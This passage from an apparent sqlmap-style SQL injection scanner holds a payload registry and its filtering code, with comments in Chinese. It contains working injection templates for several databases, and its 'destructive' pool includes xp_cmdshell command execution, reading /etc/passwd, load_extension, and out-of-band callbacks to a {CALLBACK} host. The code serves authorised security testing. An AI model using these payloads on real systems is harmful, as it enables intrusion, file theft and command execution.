  { id: 'ora-bool-where-117', dbms: ["Oracle"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=1-- -", falseTemplate: "{ORIG}') AND 1=2-- -", where: 'value' },
  { id: 'ora-bool-where-118', dbms: ["Oracle"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND '1'='1'-- -", falseTemplate: "{ORIG}')) AND '1'='2'-- -", where: 'value' },
  { id: 'ora-bool-where-119', dbms: ["Oracle"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND 1=1-- -", falseTemplate: "{ORIG}\") AND 1=2-- -", where: 'value' },
  // ---- SQLite ----
  { id: 'lite-union-100', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-101', dbms: ["SQLite"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-102', dbms: ["SQLite"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-103', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [")"], template: "{ORIG}) UNION SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-104', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION SELECT {NUM},sqlite_version(),'-- -", where: 'value' },
  { id: 'lite-union-105', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") UNION SELECT {NUM},sqlite_version(),\"-- -", where: 'value' },
  { id: 'lite-union-106', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),'-- -", where: 'position' },
  { id: 'lite-union-107', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT sql FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1),'-- -", where: 'position' },
  { id: 'lite-union-108', dbms: ["SQLite"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},(SELECT count(*) FROM sqlite_master),'-- -", where: 'value' },
  { id: 'lite-union-109', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},sqlite_version(),(SELECT group_concat(name) FROM pragma_database_list),'-- -", where: 'value' },
  { id: 'lite-union-110', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT NULL,1,sql FROM sqlite_master-- -", where: 'value' },
  { id: 'lite-union-111', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT 1,2,sqlite_version()-- -", where: 'value' },
  { id: 'lite-union-112', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT NULL,NULL,sql FROM sqlite_master-- -", where: 'value' },
  { id: 'lite-union-113', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT 1,2,3-- -", where: 'value' },
  { id: 'lite-union-114', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT 1,2,3,4-- -", where: 'value' },
  { id: 'lite-union-115', dbms: ["SQLite"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT 1,2,sqlite_version()-- -", where: 'value' },
  { id: 'lite-union-116', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT 1,2,(SELECT group_concat(name) FROM sqlite_master WHERE type='table')-- -", where: 'value' },
  { id: 'lite-union-117', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: [""], template: "{ORIG} UNION SELECT 1,2,(SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1)-- -", where: 'position' },
  { id: 'lite-union-118', dbms: ["SQLite"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT 1,2,3 FROM pragma_database_list-- -", where: 'value' },
  { id: 'lite-error-100', dbms: ["SQLite"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND badfunc_sqli_probe()=1-- -", where: 'value' },
  { id: 'lite-error-101', dbms: ["SQLite"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM non_existent_sqli_table)-- -", where: 'value' },
  { id: 'lite-error-102', dbms: ["SQLite"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 UNION SELECT 2)-- -", where: 'value' },
  { id: 'lite-error-103', dbms: ["SQLite"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND (SELECT 1 UNION SELECT 2)-- -", where: 'value' },
  { id: 'lite-error-104', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT typeof((SELECT 1 UNION SELECT 2)))='integer'-- -", where: 'value' },
  { id: 'lite-error-105', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM sqlite_sqli_nonexistent_tbl)-- -", where: 'value' },
  { id: 'lite-error-106', dbms: ["SQLite"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND (SELECT 1 FROM non_existent_sqli_table)-- -", where: 'value' },
  { id: 'lite-error-107', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND badfunc_sqli_probe_2()=1-- -", where: 'value' },
  { id: 'lite-error-108', dbms: ["SQLite"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT json('{bad json'))-- -", where: 'value' },
  { id: 'lite-error-109', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT (SELECT 1) UNION SELECT 2)-- -", where: 'value' },
  { id: 'lite-error-110', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT nonexistent_col FROM sqlite_master)-- -", where: 'value' },
  { id: 'lite-error-111', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM sqlite_master WHERE nonexistent_col=1)-- -", where: 'value' },
  { id: 'lite-error-112', dbms: ["SQLite"], technique: 'error', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND (SELECT json((SELECT sql FROM sqlite_master LIMIT 1)))-- -", where: 'position' },
  { id: 'lite-error-113', dbms: ["SQLite"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND json('{\"a\": 1}') != json('{\"a\": 2}')-- -", where: 'value' },
  { id: 'lite-error-114', dbms: ["SQLite"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND typeof((SELECT sqlite_version()))='text'-- -", where: 'value' },
  { id: 'lite-boolean-100', dbms: ["SQLite"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'lite-boolean-101', dbms: ["SQLite"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND \"1\"=\"2", where: 'value' },
  { id: 'lite-boolean-102', dbms: ["SQLite"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'lite-boolean-103', dbms: ["SQLite"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='1/**/", where: 'value' },
  { id: 'lite-boolean-104', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(sqlite_version(),1,1))='3'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(sqlite_version(),1,1))='x'-- -", where: 'value' },
  { id: 'lite-boolean-105', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT SUBSTR(sqlite_version(),1,1))='3'-- -", falseTemplate: "{ORIG}' AND (SELECT SUBSTR(sqlite_version(),1,1))='x'-- -", where: 'value' },
  { id: 'lite-boolean-106', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT COUNT(*) FROM sqlite_master)>0-- -", falseTemplate: "{ORIG} AND (SELECT COUNT(*) FROM sqlite_master)<0-- -", where: 'value' },
  { id: 'lite-boolean-107', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND EXISTS(SELECT 1)-- -", falseTemplate: "{ORIG} AND EXISTS(SELECT 1 WHERE 1=2)-- -", where: 'value' },
  { id: 'lite-boolean-108', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT typeof(sqlite_version()))='text'-- -", falseTemplate: "{ORIG} AND (SELECT typeof(sqlite_version()))='integer'-- -", where: 'value' },
  { id: 'lite-boolean-109', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT length(sqlite_version()))>0-- -", falseTemplate: "{ORIG} AND (SELECT length(sqlite_version()))<0-- -", where: 'value' },
  { id: 'lite-boolean-110', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IIF(1=1, 1, 0)=1-- -", where: 'value' },
  { id: 'lite-boolean-111', dbms: ["SQLite"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND NULLIF(1, 1) IS NULL-- -", where: 'value' },
  { id: 'lite-time-100', dbms: ["SQLite"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -", where: 'value' },
  { id: 'lite-time-101', dbms: ["SQLite"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -", where: 'value' },
  { id: 'lite-time-102', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b)-- -", where: 'value' },
  { id: 'lite-time-103', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c WHERE b.name LIKE '%a%')-- -", where: 'value' },
  { id: 'lite-time-104', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))-- -", where: 'value' },
  { id: 'lite-time-105', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(25000000))))-- -", where: 'value' },
  { id: 'lite-time-106', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({SLEEP}0000000))))/**/", where: 'value' },
  { id: 'lite-time-107', dbms: ["SQLite"], technique: 'time', level: 4, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d, sqlite_master e)-- -", where: 'value' },
  { id: 'lite-time-108', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)>0-- -", where: 'value' },
  { id: 'lite-stacked-100', dbms: ["SQLite"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}", where: 'value' },
  { id: 'lite-stacked-101', dbms: ["SQLite"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}", where: 'value' },
  { id: 'lite-stacked-102', dbms: ["SQLite"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') ; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}", where: 'value' },
  { id: 'lite-time-orderby-109', dbms: ["SQLite"], technique: 'time', level: 3, risk: 2, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)-- -", where: 'position' },
  { id: 'lite-bool-groupby-112', dbms: ["SQLite"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["","'",")","\")"], template: "{ORIG} HAVING 1=1-- -", falseTemplate: "{ORIG} HAVING 1=2-- -", where: 'value' },
  { id: 'lite-bool-groupby-113', dbms: ["SQLite"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' HAVING '1'='1'-- -", falseTemplate: "{ORIG}' HAVING '1'='2'-- -", where: 'value' },
  { id: 'lite-bool-having-114', dbms: ["SQLite"], technique: 'boolean', level: 1, risk: 1, clause: ["having"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1-- -", falseTemplate: "{ORIG} AND 1=2-- -", where: 'value' },
  { id: 'lite-bool-where-115', dbms: ["SQLite"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=1-- -", falseTemplate: "{ORIG}') AND 1=2-- -", where: 'value' },
  { id: 'lite-bool-where-116', dbms: ["SQLite"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND '1'='1'-- -", falseTemplate: "{ORIG}')) AND '1'='2'-- -", where: 'value' },
  { id: 'lite-bool-where-117', dbms: ["SQLite"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND 1=1-- -", falseTemplate: "{ORIG}\") AND 1=2-- -", where: 'value' },
  // ---- destructive ----
  { id: 'mysql-error-dest-1', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 5, risk: 3, clause: ["where"], boundary: [""], template: "{ORIG} INTO OUTFILE '/tmp/t'-- -", where: 'value' },
  { id: 'mysql-time-dest-1', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND GET_LOCK('sqli', 5)-- -", where: 'value' },
  { id: 'mysql-time-dest-2', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK(5000000, SHA1((SELECT VERSION())))-- -", where: 'value' },
  { id: 'mysql-time-dest-3', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1' RLIKE CONCAT('a', REPEAT('b', 5000000))-- -", where: 'value' },
  { id: 'mysql-stacked-dest-1', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT 'test' INTO OUTFILE '/tmp/sqli_test.txt'-- -", where: 'value' },
  { id: 'mysql-stacked-dest-2', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT LOAD_FILE('/etc/passwd')-- -", where: 'value' },
  { id: 'pg-time-dest-1', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; COPY (SELECT 1) TO PROGRAM 'sleep 5'-- -", where: 'value' },
  // [P1 2026-09-09] pg-time-dest-2/3 原为 pg_read_file/lo_import（文件读/OOB 误标成 time：
  // 小文件读取无延迟，时间检测恒不命中的「静默缺失」；lo_import 还会在目标库写对象）。
  // 改为 PG 核心函数 pg_sleep（pg_catalog 原生，无需扩展）——真延迟 + 无副作用。
  { id: 'pg-time-dest-2', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND pg_sleep(5) IS NULL-- -", where: 'value' },
  { id: 'pg-time-dest-3', dbms: ["PostgreSQL"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=pg_sleep(5)-- -", where: 'value' },
  { id: 'pg-stacked-dest-1', dbms: ["PostgreSQL"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT dblink_connect('host={CALLBACK} user=sqli')-- -", where: 'value' },
  { id: 'pg-stacked-dest-2', dbms: ["PostgreSQL"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT pg_ls_dir('/')-- -", where: 'value' },
  { id: 'lite-time-dest-1', dbms: ["SQLite"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND LIKE('ABCDEFG', HEX(RANDOMBLOB(10000000)))-- -", where: 'value' },
  { id: 'lite-stacked-dest-1', dbms: ["SQLite"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; ATTACH DATABASE '/tmp/sqli_test.sqlite' AS sqli_db-- -", where: 'value' },
  { id: 'lite-stacked-dest-2', dbms: ["SQLite"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT load_extension('/tmp/sqli_ext')-- -", where: 'value' },
  { id: 'lite-stacked-dest-3', dbms: ["SQLite"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: [";"], template: "{ORIG}; SELECT load_extension('/tmp/x') {SEP}", where: 'value' },
  { id: 'mssql-error-dest-1', dbms: ["SQL Server"], technique: 'error', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT COUNT(*) FROM OPENROWSET('SQLOLEDB', 'server={CALLBACK};uid=sqli;pwd=sqli', 'SELECT 1'))-- -", where: 'value' },
  { id: 'mssql-error-dest-2', dbms: ["SQL Server"], technique: 'error', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC master..xp_cmdshell 'whoami'-- -", where: 'value' },
  { id: 'mssql-boolean-dest-1', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC master..xp_dirtree '\\\\{CALLBACK}\\\\sqli'-- -", where: 'value' },
  { id: 'mssql-boolean-dest-2', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC master..xp_fileexist '\\\\{CALLBACK}\\\\test'-- -", where: 'value' },
  { id: 'mssql-boolean-dest-3', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC sp_execute_external_script @language=N'Python', @script=N'import time;time.sleep(5)'-- -", where: 'value' },
  { id: 'mssql-stacked-dest-1', dbms: ["SQL Server"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC master..xp_cmdshell 'whoami' {SEP}", where: 'value' },
  { id: 'mssql-stacked-dest-2', dbms: ["SQL Server"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'-- -", where: 'value' },
  { id: 'mssql-stacked-dest-3', dbms: ["SQL Server"], technique: 'stacked', level: 5, risk: 3, clause: ["where"], boundary: ["';"], template: "{ORIG}'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -", where: 'value' },
  { id: 'ora-error-dest-1', dbms: ["Oracle"], technique: 'error', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -", where: 'value' },
  { id: 'ora-time-dest-1', dbms: ["Oracle"], technique: 'time', level: 5, risk: 3, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',5) FROM DUAL)=0-- -", where: 'value' },
];

// id 唯一性自检（声明期校验，防止手写重复 id 静默吞掉条目）
{
  const seen = new Set();
  for (const p of PAYLOAD_REGISTRY) {
    if (seen.has(p.id)) {
      throw new Error(`[payloadRegistry] 重复 payload id: ${p.id}`);
    }
    seen.add(p.id);
  }
}

/**
 * 按 level/risk/dbms/clause/boundary/testFilter/testSkip 筛选 payload（对标 sqlmap 的
 * level/risk/dbms/clause 过滤语义 + --test-filter / --test-skip id 过滤）。
 *
 * testFilter / testSkip 语义（对标 sqlmap --test-filter / --test-skip）：
 *   - 逗号分隔的 id 子串列表，大小写不敏感；
 *   - testFilter：entry.id 包含任一子串才保留（白名单）；
 *   - testSkip：entry.id 包含任一子串则排除（黑名单）；
 *   - 二者可组合：先 filter 白名单，再 skip 黑名单。
 *
 * @param {{dbms?: string, technique?: string, level?: number, risk?: number,
 *          clause?: string[], boundary?: string,
 *          testFilter?: string, testSkip?: string,
 *          dbmsVersion?: { major?: number|null, minor?: number|null, patch?: number|null, raw?: string },
 *          productionMode?: boolean, confirmDestructive?: boolean}} opts
 * @returns {typeof PAYLOAD_REGISTRY} 筛选后的条目（原对象引用，不拷贝）
 */
export function selectPayloads({ dbms, technique, level, risk, clause, boundary, testFilter, testSkip, dbmsVersion, productionMode, confirmDestructive } = {}) {
  // [P0-FIX 2026-09-09] 高危池硬门（显式参数 > 扫描上下文策略 > 不施加）
  const gate = resolveDestructiveGate({ productionMode, confirmDestructive });
  // 解析 testFilter：逗号分隔 → 小写子串数组（空值过滤）
  const filterIds = testFilter
    ? String(testFilter).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
    : [];
  // 解析 testSkip：逗号分隔 → 小写子串数组（空值过滤）
  const skipIds = testSkip
    ? String(testSkip).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
    : [];

  return PAYLOAD_REGISTRY.filter((p) => {
    if (dbms && !p.dbms.includes(dbms)) return false;
    if (technique && p.technique !== technique) return false;
    if (level && p.level > level) return false;
    if (risk && p.risk > risk) return false;
    if (clause && clause.length && !p.clause.some((c) => clause.includes(c))) return false;
    if (boundary && !p.boundary.includes(boundary)) return false;
    // [P1-FIX 2026-09-05] 版本分支：条目可用 minVersion / maxVersion 声明适用区间
    //   · minVersion：目标版本 >= 该值才投放（如 MSSQL STRING_AGG 需 2017+）
    //   · maxVersion：目标版本 < 该值才投放（如 MySQL<5.7 的 password 列）
    //   版本未知（dbmsVersion 为 null 或 major 为 null）→ 不过滤（保守：不因未知砍 payload）
    if (dbmsVersion && dbmsVersion.major != null) {
      if (p.minVersion != null && !versionAtLeast(dbmsVersion, p.minVersion)) return false;
      if (p.maxVersion != null && !versionBelow(dbmsVersion, p.maxVersion)) return false;
    }
    // testFilter：白名单 — id 须包含任一 filter 子串（filterIds 为空时跳过此检查）
    if (filterIds.length > 0 && !filterIds.some((f) => p.id.toLowerCase().includes(f))) return false;
    // testSkip：黑名单 — id 包含任一 skip 子串则排除
    if (skipIds.some((s) => p.id.toLowerCase().includes(s))) return false;
    // [P0-FIX 2026-09-09] productionMode 硬门：未确认则高危池模板不投放（不抛错、不中断扫描）。
    // 实战后果：一次误配置就把 RCE/写文件 payload 送进生产库，或反过来让使用者以为 risk 生效了
    // 而实际没测——两种都是事故。抑制本身必须进报告，见 ScanManager._noteConstraint。
    if (gate && !gate.allowed && isDestructivePayload(p)) return false;
    return true;
  });
}

/**
 * [P0-FIX 2026-09-09] 统计「若不考虑高危池硬门，本配置会投到多少条高危模板」。
 * 供 ScanManager 判断是否需要往 report.summary.constraints 记一条抑制说明——
 * 避免「risk=3 但 level=1 本来就投不到」时记一条假约束（误导读的人去改无关开关）。
 * 与 selectPayloads 共用 level/risk/testFilter/testSkip 语义（不看 dbms/clause/boundary：
 * 取保守上界，宁可多记一条也不能漏记）。
 * @param {{level?:number, risk?:number, testFilter?:string, testSkip?:string}} [opts]
 * @returns {number}
 */
export function countDestructiveCandidates({ level, risk, testFilter, testSkip } = {}) {
  const filterIds = testFilter
    ? String(testFilter).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
    : [];
  const skipIds = testSkip
    ? String(testSkip).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
    : [];
  let n = 0;
  for (const p of PAYLOAD_REGISTRY) {
    if (!isDestructivePayload(p)) continue;
    if (level && p.level > level) continue;
    if (risk && p.risk > risk) continue;
    if (filterIds.length > 0 && !filterIds.some((f) => p.id.toLowerCase().includes(f))) continue;
    if (skipIds.some((s) => p.id.toLowerCase().includes(s))) continue;
    n += 1;
  }
  return n;
}

/**
 * [G1 接线 2026-09-13] 按探测闭合前缀（point.boundary）对注册表条目做「兼容族优先」稳定排序。
 *
 * 背景（对标 sqlmap boundary×payload 笛卡尔积的等价落地）：
 *   sqlmap 用 boundaries.xml × payloads/*.xml 生成「闭合形态 × 载荷族」全积并按 level 门投放；
 *   本架构的注册表条目自带 `boundary` 元数据（声明该模板适用的闭合引号形态），但历史上
 *   selectPayloads 无消费者、检测器按声明顺序全量盲发——兼容形态与无关形态混排，命中即停的
 *   检测器（Boolean 主轮有 break）浪费请求在无关变体上。
 *
 * 兼容单位是「引号族」而非「精确前缀」：
 *   模板仅内嵌最小闭合引号（如 `{ORIG}' AND '1'='1`），引号自平衡——因此单引号族条目对
 *   `')` / `'))` / `%'` 等一切单引号系上下文语法均有效（括号/通配符由模板外原样保留），
 *   实测依据 TimeBlindDetector [real-MySQL FIX 2026-09-07] 选族重排同思路。
 *
 * 排序而非硬过滤（与 sqlmap 的关键差异，刻意为之）：
 *   probeBoundary 在 WAF 拦截探测 payload 时会回退空串（见 Detector.probeBoundary 注释），
 *   硬过滤会让「探测被拦 → boundary 误判」直接灭绝对应闭合族的全部变体 → 漏检。
 *   排序优先保证：命中即停的通道更早命中（省请求）；误判时全集仍在（零回归）。
 *
 * @template T
 * @param {T[]} entries 注册表条目数组
 * @param {string} [boundary] 探测出的闭合前缀（'' / `'` / `')` / `'))` / `"` / `")` / `` ` `` / `\`）
 * @returns {T[]} 排序后数组（无引号族可判定 / 全兼容 / 全不兼容 / 输入<2 条时原样返回）
 */
export function orderEntriesByBoundary(entries, boundary) {
  if (!Array.isArray(entries) || entries.length < 2) return entries;
  // 引号族判定：取探测前缀中首个引号字符。`%'`/`%")` 的 % 是 LIKE 通配符不是闭合符；
  // `\`（反斜杠转义）与 ''（空=无闭合）族不可判定 → 原序返回（不改变现有行为）。
  const m = typeof boundary === 'string' ? boundary.match(/['"`]/) : null;
  if (!m) return entries;
  const quote = m[0];
  const isCompatible = (e) =>
    Array.isArray(e?.boundary) && e.boundary.some((b) => typeof b === 'string' && b.includes(quote));
  const compat = [];
  const rest = [];
  for (const e of entries) (isCompatible(e) ? compat : rest).push(e);
  if (compat.length === 0 || rest.length === 0) return entries;
  return [...compat, ...rest];
}

/**
 * 列出所有声明的 payload（统计/调试用）。
 * @returns {typeof PAYLOAD_REGISTRY}
 */
export function listRegistry() {
  return PAYLOAD_REGISTRY;
}

/**
 * 附加上下文筛选（不变式）：条件省略时默认宽松（全部命中），与 selectPayloads 语义一致。
 * 首个参数可传完整 ctx（含 dbms/technique/config.level/config.risk/clause），兼容检测器直接调用：
 *   selectPayloadsForCtx(ctx, { clause: ['where'] })
 * @param {object} ctx 检测上下文（dbms / technique / config）
 * @param {object} extra 额外筛选条件（并入 dbms/technique/level/risk/clause/boundary）
 * @returns {typeof PAYLOAD_REGISTRY}
 */
